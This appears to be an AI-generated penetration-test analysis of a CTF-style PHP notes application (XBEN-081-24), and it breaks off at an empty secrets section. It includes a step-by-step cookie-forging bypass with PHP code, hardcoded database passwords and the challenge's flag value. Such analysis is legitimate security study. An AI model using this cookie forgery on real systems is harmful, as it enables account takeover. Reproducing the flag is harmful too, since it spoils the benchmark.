# Penetration Test Scope & Boundaries

**Primary Directive:** This analysis is strictly limited to the **network-accessible attack surface** of the application. All subsequent tasks must adhere to this scope. Before reporting any finding (e.g., an entry point, a vulnerability sink), it has been verified against the "In-Scope" criteria.

### In-Scope: Network-Reachable Components
A component is considered **in-scope** if its execution can be initiated, directly or indirectly, by a network request that the deployed application server is capable of receiving. This includes:
- Publicly exposed web pages and API endpoints.
- Endpoints requiring authentication via the application's standard login mechanisms.
- Any developer utility, debug console, or script that has been mistakenly exposed through a route or is otherwise callable from other in-scope, network-reachable code.

### Out-of-Scope: Locally Executable Only
A component is **out-of-scope** if it **cannot** be invoked through the running application's network interface and requires an execution context completely external to the application's request-response cycle. This includes tools that must be run via:
- A command-line interface (e.g., `go run ./cmd/...`, `python scripts/...`).
- A development environment's internal tooling (e.g., a "run script" button in an IDE).
- CI/CD pipeline scripts or build tools (e.g., Dagger build definitions).
- Database migration scripts, backup tools, or maintenance utilities.
- Local development servers, test harnesses, or debugging utilities.
- Static files or scripts that require manual opening in a browser (not served by the application).

---

## 1. Executive Summary

The XBEN-081-24 application ("Simple Notes") is a containerized PHP web application following a traditional monolithic LAMP (Linux, Apache, MySQL, PHP) architecture. This CTF-style challenge application implements basic user authentication and note-taking functionality but contains **critical security vulnerabilities** that expose the entire user database and stored content to trivial exploitation.

The most severe vulnerability is an **insecure deserialization of user-controlled cookie data (CWE-502)** combined with **complete absence of server-side authorization checks**. An attacker can trivially manipulate a serialized cookie to impersonate any user, including the admin account (userid=1) whose notes contain the CTF flag `flag{98494eec-b38e-4d5c-9541-0d1a49c173aa}`. This vulnerability has a CVSS score of 9.8 (Critical) and requires no sophisticated exploitation techniques - only basic understanding of PHP serialization and cookie manipulation.

Beyond the primary deserialization vulnerability, the application suffers from systemic security failures including: end-of-life software (PHP 7.1.33 from 2019, MySQL 5.7.15 from 2016), hardcoded database credentials exposed in source code, complete absence of security headers (CSP, X-Frame-Options, HSTS), missing CSRF protection, no rate limiting for brute force attacks, and transmission of all data over unencrypted HTTP. The database credentials (`pCxvkPyS9JYq27BVdUX4N8`) are hardcoded in configuration files and exposed through Docker healthcheck commands, while the application database user possesses excessive ALL PRIVILEGES instead of following principle of least privilege. The CTF flag is stored in five different locations including environment variables, database records, and Docker configuration files, creating multiple exploitation paths even beyond the primary vulnerability.

From an external attacker's perspective with no internal network access, the application presents a high-value target with minimal defensive barriers. The attack surface consists of 4 network-accessible HTTP endpoints (sign-in, sign-up, index, logout) exposed on port 80, with the primary attack vector requiring only: (1) registration of a normal user account, (2) extraction and modification of the serialized cookie to change userid from 2 to 1, and (3) access to the index page to retrieve admin's notes containing the flag. No SQL injection, complex XSS chaining, or sophisticated exploitation techniques are required - the vulnerability is designed for educational purposes and demonstrates catastrophic consequences of trusting client-controlled data for authorization decisions.

## 2. Architecture & Technology Stack

The XBEN-081-24 application implements a classic two-tier monolithic architecture with clear separation between presentation/business logic (PHP/Apache container) and data persistence (MySQL container). The system is orchestrated using Docker Compose with two services: `apache_php` exposing port 80 for HTTP traffic (currently mapped to random host port 36423), and `mysql_db` exposing port 3306 only internally within the Docker network. This network isolation represents one of the few positive security decisions, preventing direct external database access and forcing attackers to compromise the application layer first.

### Framework & Language
The application is built on **PHP 7.1.33**, which reached End of Life on December 1, 2019, meaning it has received no security patches for over 5 years. The codebase totals approximately 310 lines of custom PHP code (excluding HTML/CSS/SQL) and uses **no external frameworks** - no Laravel, Symfony, CodeIgniter, or modern PHP framework provides structure or security middleware. All functionality is implemented using PHP built-in functions and the MySQLi extension for database connectivity. The web server is **Apache 2.x** (inherited from the php:7.1-apache Docker base image) running on Debian Buster (Debian 10), which itself uses deprecated package repositories requiring disabled GPG signature verification (`[trusted=yes]` in apt sources). This dependency on end-of-life software creates a foundation of unpatched vulnerabilities before considering application-level security issues.

The database tier runs **MySQL 5.7.15**, released in 2016 and approaching its own end-of-life status. The database schema consists of two tables with foreign key relationships: `users` (id, username, password) and `notes` (id, user_id, title, content, created_at, updated_at). The schema implements CASCADE DELETE for referential integrity but lacks encryption, audit logging, or row-level security features. The application-specific PHP code lives in `/php/challenge/` with files including `index.php` (main application logic), `sign-in.php` and `sign-up.php` (authentication endpoints), `logout.php` (session termination), `user-profile.php` (serializable class definition), `config.php` (database credentials), and `misc.php` (input validation utility). Static assets (CSS, favicon) reside in `/php/challenge/static/` but the application includes no client-side JavaScript whatsoever.

### Architectural Pattern
The monolithic architecture exhibits both strengths and critical weaknesses from a security perspective. On the positive side, the simplicity creates a small attack surface with only 4 network-accessible endpoints, no complex microservice communication channels, no service mesh vulnerabilities, and straightforward data flow from HTTP request through PHP processing to MySQL queries. The Docker containerization provides basic process isolation and the internal Docker network prevents direct database exposure to external networks. However, the monolithic design creates a single point of failure where compromise of the PHP application equals compromise of the entire system. There is no defense-in-depth through service isolation, no API gateway for centralized security controls, no Web Application Firewall, no reverse proxy with security features, and no ability to scale or isolate authentication logic separately from business logic.

The lack of any framework means the application has **no built-in security middleware** - every security control must be manually implemented. This results in missing CSRF tokens, absent rate limiting, no automatic security header injection, and critically, no framework-level authorization checks. The application follows a request-response cycle where Apache receives HTTP requests, PHP processes them by deserializing cookies (the vulnerability point), executes prepared SQL statements (the one strong security control), and returns server-rendered HTML with basic output encoding. Session state is managed through PHP's native session handler combined with the insecure serialized cookie mechanism, creating a dual authentication system where either session OR cookie grants access (logical OR vulnerability).

### Critical Security Components
The application implements exactly **one strong security control**: SQL injection prevention through prepared statements with parameterized queries. Every database interaction uses `$stmt = $conn->prepare()` followed by `$stmt->bind_param()`, with additional (redundant) protection via `mysqli_real_escape_string()`. This defense-in-depth approach to SQL injection is the architectural bright spot, preventing what would otherwise be a trivial second vulnerability. Input validation exists through a custom `validateInput()` function that applies `trim()`, `stripslashes()`, and `htmlspecialchars()` to all user inputs, providing basic XSS protection in the HTML body context. However, this protection is bypassed by the deserialization vulnerability which allows attackers to inject unvalidated data directly into the application context.

Password security uses **bcrypt hashing** via PHP's `password_hash()` with `PASSWORD_DEFAULT` (bcrypt cost factor 10), representing industry-standard credential storage. Registration creates bcrypt hashes stored in the database, and authentication uses `password_verify()` for timing-attack-resistant comparison. This is undermined by transmission over unencrypted HTTP and the ability to bypass authentication entirely through cookie manipulation. The admin account pre-seeded in the database has username "admin" and password "NO LOGIN" (an invalid hash), intentionally preventing normal authentication and forcing exploitation of the authorization bypass vulnerability to access admin's notes containing the flag.

**Completely absent security components** include: all HTTP security headers (Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security, X-XSS-Protection, Referrer-Policy, Permissions-Policy), any CSRF token generation or validation, any rate limiting or brute force protection, any account lockout mechanisms, any session timeout configuration beyond PHP defaults, any audit logging of security events, any monitoring or intrusion detection, any WAF or input filtering beyond basic sanitization, and any cookie integrity protection (HMAC signatures, encryption, or secure flags). The Apache configuration in `/php/apache/000-default.conf` is minimal - just a basic VirtualHost definition pointing DocumentRoot to `/var/www/html` with no security hardening whatsoever.

## 3. Authentication & Authorization Deep Dive

The application implements a **hybrid dual authentication system** combining PHP native sessions with serialized cookie-based identity, creating both redundancy and critical vulnerabilities. Upon successful login, the application establishes two parallel authentication mechanisms: (1) traditional server-side session via `session_start()` and `$_SESSION['username']`, and (2) client-side serialized cookie via `setcookie('data', base64_encode(serialize($profile)))`. The authentication check in `index.php` line 8 uses logical OR: `if (!isset($_SESSION['username']) && !isset($_COOKIE["data"]))`, meaning if EITHER authentication mechanism is present, access is granted. This design decision creates the critical vulnerability where server-side session validation can be completely bypassed by presenting only a manipulated cookie.

### Authentication Mechanisms and Their Security Properties

**Authentication Endpoints - Complete Enumeration:**

1. **POST /sign-in.php** (Login endpoint)
   - **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/sign-in.php`
   - **Lines:** 8-51
   - **Parameters:** `username` (string), `password` (string)
   - **Process Flow:**
     - Line 6: `session_start()` initializes session
     - Lines 12-13: Input validation via `validateInput()` applying `htmlspecialchars()`
     - Line 21: SQL injection protection via `mysqli_real_escape_string()`
     - Lines 23-24: Prepared statement `SELECT * FROM users WHERE username=?`
     - Line 33: Password verification `password_verify($password, $hashed_password)`
     - Lines 34-36: On success, create UserProfile object with userid and username
     - **Line 37 - CRITICAL VULNERABILITY:** `setcookie('data', base64_encode(serialize($profile)));`
     - Line 38: Session regeneration `session_regenerate_id()` (good practice)
     - Line 39: Session variable `$_SESSION['username'] = $row['username']`
     - Line 40: Redirect to `index.php`
   - **Security Issues:** Cookie created without HttpOnly, Secure, or SameSite flags; serialized object lacks integrity protection (no HMAC signature)

2. **POST /sign-up.php** (Registration endpoint)
   - **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/sign-up.php`
   - **Lines:** 5-34
   - **Parameters:** `username` (string), `password` (string)
   - **Process Flow:**
     - Lines 9-10: Input validation via `validateInput()`
     - Line 20: Password hashing `password_hash($password, PASSWORD_DEFAULT)`
     - Lines 22-23: Prepared statement `INSERT INTO users (username, password) VALUES (?, ?)`
     - Line 26: Redirect to `sign-in.php`
   - **Security Issues:** No password complexity requirements, no account enumeration protection, no CAPTCHA, no rate limiting

3. **GET /logout.php** (Session termination endpoint)
   - **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/logout.php`
   - **Lines:** 1-8
   - **Process Flow:**
     - Line 2: `session_start()`
     - Line 3: `session_unset()` clears session variables
     - Line 4: `session_destroy()` destroys session
     - Line 5: Cookie deletion `setcookie("data", "", time() - 3600)`
     - Line 6: Redirect to `sign-in.php`
   - **Security Issues:** No session token invalidation server-side, cookie deletion without proper flags

4. **Password Reset/Recovery:** NOT IMPLEMENTED - No password reset mechanism exists

### Session Management and Token Security

**Session Cookie Configuration - CRITICAL VULNERABILITY:**
The application uses PHP's default session configuration without any custom security hardening. Session initialization occurs via `session_start()` in three files (sign-in.php:6, index.php:6, logout.php:2) but there is **no call to `session_set_cookie_params()`** to configure secure session cookie attributes. This means session cookies (PHPSESSID) are created with PHP's default flags, which typically lack HttpOnly, Secure, and SameSite protections. The application does implement session ID regeneration on login (`session_regenerate_id()` at sign-in.php:38), which mitigates session fixation attacks - this represents one of the few proper security practices.

**Authentication Cookie Configuration - COMPLETE SECURITY FAILURE:**
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/sign-in.php`, **Line:** 37
```php
setcookie('data', base64_encode(serialize($profile)));
```

This single line represents a catastrophic security failure combining multiple vulnerabilities:
- **No HttpOnly flag:** Cookie accessible to JavaScript via `document.cookie`, enabling XSS-based cookie theft
- **No Secure flag:** Cookie transmitted over HTTP, vulnerable to network interception/MITM attacks
- **No SameSite attribute:** Vulnerable to CSRF attacks where malicious sites can trigger authenticated requests
- **No expiration time:** Session cookie (cleared on browser close) but no server-side timeout enforcement
- **No domain restriction:** Defaults to current domain, but could be set more restrictively
- **No path restriction:** Cookie sent with all requests to the domain
- **No integrity protection:** Base64 encoding provides NO security - trivially decoded and re-encoded
- **No encryption:** Cookie contents visible to anyone who intercepts it
- **No HMAC signature:** No way to detect tampering, enabling arbitrary object injection

The `UserProfile` class defined in `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/user-profile.php` lines 3-7 contains only public properties (`$userid` and `$username`), making serialization predictable and exploitation trivial:
```php
Class UserProfile {
    public $userid;
    public $username;
}
```

### Authorization Model and Bypass Scenarios

**Authorization Check - FUNDAMENTAL DESIGN FLAW:**
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/index.php`, **Lines:** 8-15
```php
if (!isset($_SESSION['username']) && !isset($_COOKIE["data"])) {
    header("Location: sign-in.php");
    exit();
}

$obj = unserialize(base64_decode($_COOKIE["data"]));
$userid = $obj->userid;
$username = $obj->username;
```

This code exemplifies **complete absence of authorization** beyond authentication. The application checks only whether a session OR cookie exists, then **trusts the userid contained in that cookie without any validation**. The userid extracted from the client-controlled serialized object (line 14) is subsequently used to query notes (lines 73-74):
```php
$stmt = $conn->prepare("SELECT * FROM notes WHERE user_id=?");
$stmt->bind_param("i", $userid);
```

**There is no comparison** between the cookie-provided userid and any server-side session variable, no role-based access control, no permission checking, and no validation that the authenticated user has permission to access the requested userid's data. This represents a textbook violation of the security principle "never trust client input for authorization decisions."

**Authorization Bypass Exploitation (Step-by-Step):**
1. **Register normal user account:** POST to `/sign-up.php` with username="attacker", password="password123"
2. **Authenticate normally:** POST to `/sign-in.php` with credentials, receive valid session + cookie
3. **Extract cookie value:** Browser DevTools → Application → Cookies → Copy `data` cookie value
4. **Decode cookie:** `echo "TzoxMToiVXNlclByb2ZpbGUiOjI6e3M6NjoidXNlcmlkIjtpOjI7..." | base64 -d`
5. **Observe serialized object:** `O:11:"UserProfile":2:{s:6:"userid";i:2;s:8:"username";s:8:"attacker";}`
6. **Modify userid:** Change `i:2;` to `i:1;` (admin's userid)
7. **Create malicious object:** `O:11:"UserProfile":2:{s:6:"userid";i:1;s:8:"username";s:8:"attacker";}`
8. **Re-encode:** `echo 'O:11:"UserProfile":2:{s:6:"userid";i:1;...' | base64`
9. **Inject cookie:** Set `data` cookie to new base64 value
10. **Access application:** Navigate to `/index.php`, application queries notes for userid=1
11. **Extract flag:** Admin's "Secret" note contains `flag{98494eec-b38e-4d5c-9541-0d1a49c173aa}`

**Alternative exploitation using PHP:**
```php
<?php
class UserProfile {
    public $userid = 1;  // Admin user ID
    public $username = "attacker";
}
$profile = new UserProfile();
$cookie = base64_encode(serialize($profile));
echo $cookie;
// Result: TzoxMToiVXNlclByb2ZpbGUiOjI6e3M6NjoidXNlcmlkIjtpOjE7czo4OiJ1c2VybmFtZSI7czo4OiJhdHRhY2tlciI7fQ==
?>
```

### Multi-tenancy Security Implementation

The application implements **row-level security through user_id foreign keys** but trusts client-provided user_id values, creating a complete bypass. The notes table schema includes `user_id INT NOT NULL` with `FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE`, ensuring referential integrity at the database level. However, the application's authorization model fails to enforce that the authenticated user can only access their own user_id.

**Data Isolation Query:**
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/index.php`, **Lines:** 73-76
```php
$stmt = $conn->prepare("SELECT * FROM notes WHERE user_id=?");
$stmt->bind_param("i", $userid);
$stmt->execute();
$result = $stmt->get_result();
```

This prepared statement correctly implements SQL injection protection, but the `$userid` parameter comes from **line 14: `$userid = $obj->userid;`** - directly from the unserialized cookie with no validation. A proper implementation would validate: `if ($obj->userid !== $_SESSION['user_id']) { die("Authorization failed"); }`, but no such check exists anywhere in the codebase.

**Admin Account Characteristics:**
- **Username:** admin
- **User ID:** 1 (first inserted record in database initialization)
- **Password:** "NO LOGIN" (invalid bcrypt hash, intentionally preventing authentication)
- **Notes:** Two notes - "Secret" containing the flag, and "Notes" with placeholder content
- **Database insertion:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/mysql/init.sql` line 28-31

### SSO/OAuth/OIDC Flows
**Status:** NOT IMPLEMENTED - The application uses only traditional username/password authentication with no OAuth, OpenID Connect, SAML, or single sign-on integration. No authorization servers, no token endpoints, no client ID/secret configuration, and therefore no state/nonce validation concerns.

## 4. Data Security & Storage

The application handles multiple categories of sensitive data with varying levels of protection, ranging from industry-standard password hashing to complete absence of encryption for user-generated content. The data security posture reveals a mixed implementation where some security controls (bcrypt password hashing, prepared statements) meet professional standards while others (hardcoded credentials, plaintext note storage, unencrypted transport) represent critical security failures.

### Database Security

**Database Architecture:**
The MySQL 5.7.15 database implements a simple two-table schema with foreign key relationships. The `users` table (schema at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/mysql/init.sql` lines 12-16) stores credentials with structure: `id INT AUTO_INCREMENT PRIMARY KEY, username VARCHAR(255) NOT NULL UNIQUE, password VARCHAR(255) NOT NULL`. The password column is appropriately sized for bcrypt hashes (60 characters) with extra margin. Username uniqueness is enforced at the database level via UNIQUE constraint, preventing duplicate account registration. However, the schema lacks several security-relevant fields: no email for account recovery, no account status (active/locked/disabled), no failed login counter for brute force detection, no created_at/updated_at timestamps for audit trails, and no multi-factor authentication token storage.

The `notes` table (lines 18-26) implements row-level security through user_id foreign keys: `id INT AUTO_INCREMENT PRIMARY KEY, user_id INT NOT NULL, title VARCHAR(256) NOT NULL, content TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP, FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE`. The CASCADE DELETE ensures referential integrity - deleting a user automatically deletes their notes. Timestamps enable audit trails and could support data retention policies, though none are implemented. The content field uses TEXT datatype (up to 65,535 characters) stored in **plaintext with no encryption**, allowing anyone with database access to read all notes directly. The admin user's notes are pre-seeded at lines 30-31 with the CTF flag in plaintext.

**Database Access Controls - CRITICAL SECURITY FAILURES:**

**Application User Privileges** (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/mysql/init.sql` lines 3-5):
```sql
CREATE USER 'db_username'@'%' IDENTIFIED BY 'pCxvkPyS9JYq27BVdUX4N8';
GRANT ALL PRIVILEGES ON db.* TO 'db_username'@'%';
```

This configuration violates multiple security principles:
- **Excessive privileges:** `ALL PRIVILEGES` grants SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, ALTER, INDEX, and more. The application only needs SELECT, INSERT, UPDATE, DELETE for normal operation. With current privileges, compromise of the application enables dropping all tables, modifying schema, or destroying the database entirely.
- **Wildcard host:** `'%'` allows connections from any host within the Docker network (and potentially beyond if network misconfigured). Should be restricted to `'apache_php'` (the specific container name).
- **Plaintext password in SQL:** The password `pCxvkPyS9JYq27BVdUX4N8` is embedded in the initialization script, committed to version control, and exposed to anyone with source code access.

**Root Account Configuration** (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/mysql/Dockerfile` line 3):
```dockerfile
ENV MYSQL_ROOT_PASSWORD=password
```
The MySQL root password is literally "password", hardcoded in the Dockerfile, and visible to anyone with access to the Docker image or running container. While root access is typically not needed for application operations, this weak credential creates a backup attack vector if MySQL port 3306 were to be exposed externally.

**Database Credential Exposure Vectors:**
1. **Source code:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/config.php` lines 2-5 contain plaintext credentials
2. **Docker Compose:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/docker-compose.yml` line 9 exposes password in healthcheck command: `mysqladmin ping --host=mysql_db --user=root --password=password`
3. **Process listing:** During healthcheck execution, `ps aux` on the container would show the password in the command line
4. **Docker inspect:** `docker inspect apache_php` or `docker-compose config` reveals environment variables and healthcheck commands
5. **Version control:** Credentials committed to Git history, visible to anyone with repository access

### Data Flow Security

**Password Data Flow (Secure):**
1. **Registration:** User submits password → validateInput() applies htmlspecialchars() → password_hash() generates bcrypt hash → Prepared statement inserts hash into database
2. **Authentication:** User submits password → validateInput() sanitization → Prepared statement retrieves hash → password_verify() compares timing-safe → On success, session + cookie created
3. **Storage:** Bcrypt hash (60 characters, cost factor 10) stored in users.password column
4. **Transmission:** **VULNERABILITY:** Password transmitted in plaintext over HTTP (no TLS/HTTPS)

**Session/Cookie Data Flow (Insecure):**
1. **Session creation:** sign-in.php:38 `session_regenerate_id()` → session_id stored server-side → PHPSESSID cookie sent to browser
2. **Serialized cookie creation:** sign-in.php:34-37 creates UserProfile object → serialize($profile) → base64_encode() → setcookie('data', ...) **NO ENCRYPTION, NO HMAC**
3. **Cookie transmission:** Sent over HTTP in plaintext, visible to network sniffers
4. **Cookie deserialization:** index.php:13 extracts cookie → base64_decode() → unserialize() **TRUSTS CLIENT INPUT**
5. **Authorization decision:** index.php:14 extracts userid from unserialized object → Uses for database query **NO VALIDATION**

**User Content Data Flow (Plaintext):**
1. **Note creation:** User submits title/content → validateInput() applies htmlspecialchars() → mysqli_real_escape_string() (redundant) → Prepared statement inserts into notes table
2. **Storage:** VARCHAR(256) title and TEXT content stored in plaintext, no encryption at rest
3. **Retrieval:** Prepared statement `SELECT * FROM notes WHERE user_id=?` → Results echoed to HTML with htmlspecialchars() protection
4. **Transmission:** HTML response sent over HTTP in plaintext
5. **Access control:** **VULNERABILITY:** user_id comes from client cookie, enabling unauthorized access

**Flag Data Flow (Multiple Paths):**
1. **Build-time injection:** .env file defines FLAG → docker-compose.yml passes as build arg → mysql/Dockerfile sed replaces FLAG_PLACEHOLDER in init.sql → Database seeded with flag in admin's note
2. **Environment variable:** php/Dockerfile sets ENV FLAG → Available to PHP via getenv('FLAG') or $_ENV['FLAG']
3. **Database storage:** mysql/init.sql line 31 inserts flag into notes.content for user_id=1
4. **Retrieval paths:** (a) Authorization bypass to access admin notes, (b) Database credential compromise, (c) Environment variable extraction via RCE/phpinfo, (d) Docker image forensics

### Multi-tenant Data Isolation

**Isolation Mechanism:** The application attempts row-level security by filtering queries with `WHERE user_id=?`, but the user_id value comes from client-controlled cookie data, creating a complete bypass. Each user's notes are associated with their user_id foreign key, and queries should filter to only that user's data. However, since the authorization check trusts the cookie-provided userid (index.php:14), an attacker can change their userid to any value and access other users' notes.

**Data Leakage Vectors:**
1. **Primary vector:** Cookie manipulation to change userid from legitimate value to target user (especially userid=1 for admin)
2. **Secondary vector:** Direct database access if credentials compromised (hardcoded in source code)
3. **Tertiary vector:** SQL injection (mitigated by prepared statements) - not exploitable in this application
4. **Error message disclosure:** Database errors might reveal schema, table names, or query structure (error reporting not explicitly disabled)

**No Tenant Isolation at Database Level:** The database schema does not implement row-level security policies, views, or stored procedures to enforce access control. All security depends on application-level filtering, which is trivially bypassed. Modern approaches like PostgreSQL Row-Level Security (RLS) or MySQL 8.0 roles could provide defense-in-depth, but MySQL 5.7.15 lacks these features and the application doesn't use them anyway.

## 5. Attack Surface Analysis

The XBEN-081-24 application exposes a minimal but highly vulnerable attack surface consisting of 4 network-accessible HTTP endpoints, 8 user input vectors, and 1 critical deserialization sink that enables complete compromise. The attack surface is deliberately small for a CTF challenge, focusing exploitation on quality over quantity of vulnerabilities - specifically highlighting the catastrophic consequences of trusting client-controlled data for authorization decisions.

### External Entry Points

**Endpoint 1: POST /sign-up.php (User Registration)**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/sign-up.php`
- **Authentication:** None (Public)
- **HTTP Methods:** GET (display form), POST (submit registration)
- **Input Parameters:**
  - `username` (string, required) - Validated via validateInput(), SQL-escaped, prepared statement
  - `password` (string, required) - Validated via validateInput(), bcrypt hashed before storage
- **Response:** Redirect to sign-in.php on success, error message on failure
- **Security Analysis:**
  - ✓ **SQL injection protected:** Prepared statements at lines 22-23
  - ✓ **Password security:** Bcrypt hashing with PASSWORD_DEFAULT at line 20
  - ✗ **No password complexity requirements:** Accepts any password length/content
  - ✗ **No rate limiting:** Attacker can register unlimited accounts for credential stuffing
  - ✗ **No CAPTCHA:** Vulnerable to automated account creation
  - ✗ **No email verification:** Username is sole identifier
  - ✗ **Username enumeration:** Error messages reveal if username exists (database UNIQUE constraint error)
  - ✗ **CSRF vulnerability:** No token validation, attacker can force victim to register accounts
- **Attack Vectors:** Mass account creation, username enumeration for targeted attacks, CSRF to create attacker-controlled accounts in victim's browser session

**Endpoint 2: POST /sign-in.php (Authentication)**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/sign-in.php`
- **Authentication:** None (Public)
- **HTTP Methods:** GET (display form), POST (submit credentials)
- **Input Parameters:**
  - `username` (string, required) - Validated, SQL-escaped, prepared statement
  - `password` (string, required) - Validated, compared via password_verify()
- **Response:** Redirect to index.php with session + cookie on success, error message on failure
- **Security Analysis:**
  - ✓ **SQL injection protected:** Prepared statements at lines 23-24
  - ✓ **Password verification:** Timing-safe password_verify() at line 33
  - ✓ **Session regeneration:** session_regenerate_id() prevents session fixation at line 38
  - ✗ **CRITICAL: Insecure cookie creation:** setcookie() at line 37 with no integrity protection
  - ✗ **No rate limiting:** Unlimited brute force attempts possible
  - ✗ **No account lockout:** Failed attempts don't lock accounts
  - ✗ **No CAPTCHA:** Automated attacks unhindered
  - ✗ **Generic error messages:** "Invalid username or password" (good - prevents enumeration)
  - ✗ **CSRF vulnerability:** No token validation
  - ✗ **Cleartext transmission:** HTTP only, credentials visible to network sniffers
- **Attack Vectors:** Brute force password guessing, credential stuffing with leaked password lists, cookie manipulation after successful login, network sniffing to capture credentials

**Endpoint 3: GET/POST /index.php (Main Application - Notes CRUD)**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/index.php`
- **Authentication:** Required (Session OR Cookie)
- **HTTP Methods:** GET (display notes), POST (create note)
- **Input Parameters:**
  - `title` (string, required for POST) - Validated, SQL-escaped, prepared statement
  - `content` (string, required for POST) - Validated, SQL-escaped, prepared statement
  - `Cookie: data` (base64 serialized UserProfile) - **CRITICAL: Deserialized without validation at line 13**
- **Response:** HTML page displaying user's notes
- **Security Analysis:**
  - ✓ **SQL injection protected:** Prepared statements at lines 33-34 (insert), 73-74 (select)
  - ✓ **XSS protection:** htmlspecialchars() applied to output at lines 85, 88
  - ✗✗✗ **CRITICAL: Insecure deserialization:** unserialize(base64_decode($_COOKIE["data"])) at line 13
  - ✗✗✗ **CRITICAL: No authorization:** userid from cookie used directly for queries at line 14
  - ✗ **Authentication bypass via OR logic:** Accepts session OR cookie, not both required
  - ✗ **No CSRF protection:** Attacker can force note creation
  - ✗ **No input length limits:** TEXT field accepts up to 65KB per note
  - ✗ **No rate limiting:** Spam notes possible
  - ✗ **Cleartext storage:** Notes stored in plaintext database
- **Attack Vectors:** Cookie manipulation for privilege escalation (PRIMARY ATTACK), CSRF to create notes, reflected XSS via cookie username manipulation (bypasses input validation), insecure deserialization for potential RCE if gadget chains exist

**Endpoint 4: GET /logout.php (Session Termination)**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/logout.php`
- **Authentication:** Session required
- **HTTP Methods:** GET
- **Input Parameters:** None
- **Response:** Redirect to sign-in.php
- **Security Analysis:**
  - ✓ **Session cleanup:** session_unset() and session_destroy() at lines 3-4
  - ✓ **Cookie deletion:** Expires 'data' cookie at line 5
  - ✗ **CSRF vulnerability:** GET request can be triggered by attacker (e.g., `<img src="/logout.php">`)
  - ✗ **No session token blacklist:** Session ID not invalidated server-side
  - ⚠️ **HTTP method:** Should use POST with CSRF token, not GET
- **Attack Vectors:** CSRF logout attack (force victim logout), session fixation if victim re-authenticates with same session ID (mitigated by session_regenerate_id on login)

### Internal Service Communication
**Status:** NOT APPLICABLE - This is a monolithic application with no microservices architecture. The only internal communication is between the PHP/Apache container and MySQL container over the Docker network on port 3306 using MySQL protocol. This communication occurs within the Docker internal network (not exposed externally), uses MySQL's authentication (username: db_username, password: pCxvkPyS9JYq27BVdUX4N8), but does **not use TLS/SSL encryption** for the database connection. Database traffic within the Docker network is transmitted in cleartext, though this is less critical since the network is isolated from external access.

Trust boundary: The PHP application trusts the MySQL database completely - no additional validation of query results, no integrity checking of returned data, assumes database contents are authentic. If the database were compromised (via hardcoded credential exposure), an attacker could modify data and the application would trust it without question.

### Input Validation Patterns

**Validation Function:**
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/misc.php`, **Lines:** 3-8
```php
function validateInput($data) {
    $data = trim($data);              // Remove leading/trailing whitespace
    $data = stripslashes($data);      // Remove backslashes
    $data = htmlspecialchars($data);  // Convert special chars to HTML entities
    return $data;
}
```

**Application Points:**
- sign-in.php:12-13 - username and password before authentication
- sign-up.php:9-10 - username and password before registration
- index.php:21-22 - title and content before note creation

**Security Assessment:**
- ✓ **XSS prevention:** `htmlspecialchars()` encodes `<`, `>`, `&`, `"`, `'` to HTML entities, preventing script injection in HTML body context
- ⚠️ **Encoding applied at input:** Validation occurs before storage, so encoded data is stored in database and remains encoded on retrieval
- ✗ **No length validation:** No maximum length checks beyond database column limits
- ✗ **No format validation:** No regex patterns for username/password requirements
- ✗ **No whitelist validation:** Does not check for allowed characters
- ✗ **Not context-aware:** Same validation applied to all inputs regardless of context
- ✗ **Bypassed by deserialization:** Cookie-injected username at index.php:15 never goes through validateInput()

**Additional SQL Protection (Defense in Depth):**
Multiple files apply `mysqli_real_escape_string()` AFTER validateInput() and BEFORE prepared statements:
- sign-in.php:21 - `$username = mysqli_real_escape_string($conn, $username);`
- sign-up.php:18-19 - Escapes username and password
- index.php:30-31 - Escapes title and content

This is technically redundant when using prepared statements but provides defense-in-depth. However, it suggests the developer may not fully trust prepared statements or was cargo-culting multiple protection mechanisms without understanding which is necessary.

### Background Processing
**Status:** NOT IMPLEMENTED - The application has no asynchronous job processing, no message queues (RabbitMQ, Redis, SQS), no background workers, no cron jobs triggered by user input, and no scheduled tasks. All processing is synchronous within the HTTP request-response cycle. The only asynchronous element is the Docker healthcheck command (`mysqladmin ping` running periodically), but this is infrastructure-level and not triggered by user input.

**Upload Directory Created But Unused:**
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/Dockerfile`, **Line:** 19
```dockerfile
RUN mkdir /var/www/html/upload
```
An upload directory is created with web server write permissions (`chown -R www-data:www-data`), but there is **no file upload functionality** in the PHP code - no `$_FILES` references, no `move_uploaded_file()` calls, no file upload forms. This could be a future feature or deliberate misdirection in the CTF challenge.

## 6. Infrastructure & Operational Security

The infrastructure configuration reveals multiple critical security failures in secrets management, deployment architecture, and operational security practices. The application uses Docker Compose orchestration with no production-grade security hardening, relies on end-of-life software across the entire stack, and stores sensitive credentials in plaintext throughout the configuration files.

### Secrets Management

